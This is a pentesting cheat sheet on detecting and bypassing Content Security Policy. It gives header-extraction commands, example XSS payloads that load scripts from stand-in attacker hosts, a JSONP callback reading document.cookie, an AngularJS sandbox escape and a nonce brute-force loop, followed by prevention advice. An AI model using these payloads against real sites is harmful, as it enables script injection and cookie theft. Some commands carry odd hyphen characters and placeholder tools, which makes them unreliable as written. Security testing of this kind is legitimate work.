# CSP Bypass Check

> Comprehensive guide for **Content Security Policy (CSP) bypass testing** during web pentests, bug bounty hunting, and security assessments.  
> Covers CSP detection, policy analysis, common misconfigurations, bypass techniques (unsafe‑inline, script‑src, nonce/seed predictability, CSP injection), and 2025–2026 trends (strict‑dynamic, trust‑type, CSP Level 4 features, CSP‑bypass chained with XSS).

Content Security Policy (CSP) is a security layer that helps mitigate XSS, data injection, and other code‑injection attacks. However, misconfigured CSPs can often be bypassed, allowing attackers to execute malicious scripts.

## Methodology (Based on OWASP CSP Cheat Sheet & PortSwigger)

**1. Detect CSP headers** – Extract `Content‑Security‑Policy` (or `X‑Content‑Security‑Policy`) from HTTP responses.

**2. Analyze policy** – Parse directives (`script‑src`, `style‑src`, `object‑src`, `default‑src`, etc.) and sources (`'self'`, `'unsafe‑inline'`, `'unsafe‑eval'`, `https:`, nonces, hashes, hosts).

**3. Identify weak spots** – Look for:
   - `'unsafe‑inline'` in `script‑src` or `style‑src`
   - Wildcard hosts (`*`, `*.example.com`)
   - Missing `object‑src` or `base‑uri` directives
   - Predictable nonces/seed (time‑based, incremental)
   - Overly permissive `frame‑ancestors` (clickjacking)
   - Use of `'strict‑dynamic'` without proper fallback

**4. Test bypasses** – Attempt to bypass CSP using known techniques (see below). If CSP is strict, look for CSP injection (e.g., via reflected parameters) or chained vulnerabilities (JSONP, AngularJS sandbox escape).

**5. Verify impact** – Confirm that bypass leads to script execution (XSS). Use proof‑of‑concept payloads.

## Tool Installation & Setup

```bash
# CSP Evaluator (Google) – CLI or online tool
# Online: https://csp‑evaluator.withgoogle.com/
# CLI: npm install -g csp‑evaluator

# CSP Scanner (Burp Suite extension)
# Install via BApp Store: "CSP Scanner"

# httpx – extract CSP headers from targets
go install github.com/projectdiscovery/httpx/cmd/httpx@latest

# nuclei – CSP detection templates
nuclei -t ~/nuclei‑templates/security‑misconfiguration/csp‑misconfig.yaml -list targets.txt
```

## Detection & Analysis Commands

```bash
# 1. Extract CSP headers from live subdomains
cat https-subs.txt | httpx -silent -include-response-header | grep -i "content-security-policy" | anew csp-headers.txt

# 2. Parse and format CSP for readability
curl -sI https://target.com | grep -i content-security-policy | sed 's/Content-Security-Policy:\s*//i'

# 3. Analyze CSP with Google's CSP Evaluator (online)
#    Copy CSP header to https://csp‑evaluator.withgoogle.com/

# 4. Manual inspection of directives
curl -sI https://target.com | grep -i content-security-policy | tr ',' '\n' | while read dir; do echo "$dir"; done

# 5. Check for multiple CSP headers (may cause conflicts)
curl -sI https://target.com | grep -i content-security-policy | wc -l
```

## Common CSP Bypass Techniques

### Unsafe‑Inline & Unsafe‑Eval
```bash
# If script‑src includes 'unsafe‑inline', any inline script is allowed.
# If 'unsafe‑eval' is present, eval() and similar functions work.
# Test with:
<script>alert(1)</script>
```

### Wildcard Sources
```bash
# script‑src * or *.example.com allows scripts from any (sub)domain.
# Attacker can host malicious JS on a subdomain they control.
<script src="http://attacker.example.com/evil.js"></script>
```

### Missing object‑src / default‑src
```bash
# If object‑src is not defined, it falls back to default‑src (often 'self').
# If default‑src is '*', object/embed tags can load Flash/PDF with XSS.
<object data="https://attacker.com/exploit.swf"></object>
```

### Predictable Nonces
```bash
# Nonces (nonce‑123abc) that are predictable (time‑based, incremental) can be guessed.
# Brute‑force nonce via script:
for i in {1..1000}; do echo "<script nonce=\"$i\">alert(1)</script>"; done | send‑to‑target
```

### CSP Injection via Reflected Parameters
```bash
# If a parameter is reflected in CSP header, attacker can inject directives.
# Example: https://target.com/?csp=script‑src https://evil.com
# Response: Content‑Security‑Policy: script‑src https://evil.com 'self'
```

### JSONP Callbacks
```bash
# JSONP endpoints allowed by CSP can be abused to exfiltrate data.
<script src="https://target.com/api/jsonp?callback=alert(document.cookie)//"></script>
```

### AngularJS Sandbox Escape
```bash
# AngularJS apps with CSP can be bypassed via sandbox escape payloads.
# Example: {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

### strict‑dynamic Bypass
```bash
# strict‑dynamic allows scripts dynamically added by already‑trusted scripts.
# If a trusted script can be manipulated (e.g., via DOM clobbering), attacker can inject.
<script src="trusted.js"></script>
<script>
  var s = document.createElement('script');
  s.src = 'https://evil.com/exploit.js';
  document.body.appendChild(s);
</script>
```

### Iframe CSP Inheritance
```bash
# CSP is not inherited by child iframes unless explicitly set via `frame‑src` / `child‑src`.
# Attacker can embed a page with lax CSP inside an iframe and communicate via postMessage.
<iframe src="https://target.com/vulnerable‑page"></iframe>
```

## Advanced Bypasses & 2025‑2026 Trends

**1. CSP Level 4 features** – New directives (`trusted‑types`, `require‑trusted‑types‑for`) and keywords (`'strict‑dynamic'`, `'unsafe‑hashes'`). Misconfigurations may lead to bypasses.

**2. Trusted Types bypass** – If Trusted Types policy is incorrectly configured, bypass via DOM clobbering or prototype pollution.

**3. CSP‑bypass chained with XSS** – Use CSP bypass to execute XSS in otherwise protected applications.

**4. Service Worker CSP bypass** – Service workers can be registered under certain CSPs, leading to persistent XSS.

**5. WebAssembly (Wasm) and CSP** – `script‑src` may not control Wasm execution; test with `WebAssembly.instantiate`.

**6. CSP reporting endpoints** – `report‑uri` / `report‑to` may leak sensitive data via violation reports.

**7. Browser‑specific quirks** – Different browsers interpret CSP differently (Chrome vs Firefox vs Safari). Test across browsers.

## Detection & Verification

- **Bypass successful** – Malicious script executes (alert, XSS payload).
- **CSP violation reports** – Monitor `report‑uri` endpoints for triggered violations (if accessible).
- **Browser console errors** – Check for CSP violation warnings that indicate blocked resources.

## Prevention Guidance (Developer‑Focused)

1. **Adopt strict CSP** – Use nonces/hashes instead of `'unsafe‑inline'`.
2. **Avoid wildcards** – Restrict sources to specific trusted domains.
3. **Include all necessary directives** – `object‑src`, `base‑uri`, `frame‑ancestors`, etc.
4. **Use `'strict‑dynamic'` correctly** – Combine with nonces/hashes, provide fallback for older browsers.
5. **Implement Trusted Types** – For DOM XSS protection.
6. **Regularly audit CSP** – Use CSP evaluator tools to spot misconfigurations.
7. **Monitor violation reports** – Set up alerting for unexpected violations.
8. **Keep abreast of CSP spec updates** – Follow CSP Level 4 and browser implementations.

## References

- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [PortSwigger: CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- [Google CSP Evaluator](https://csp‑evaluator.withgoogle.com/)
- [CSP‑bypass‑wiki (GitHub)](https://github.com/EdOverflow/csp‑bypass‑wiki)
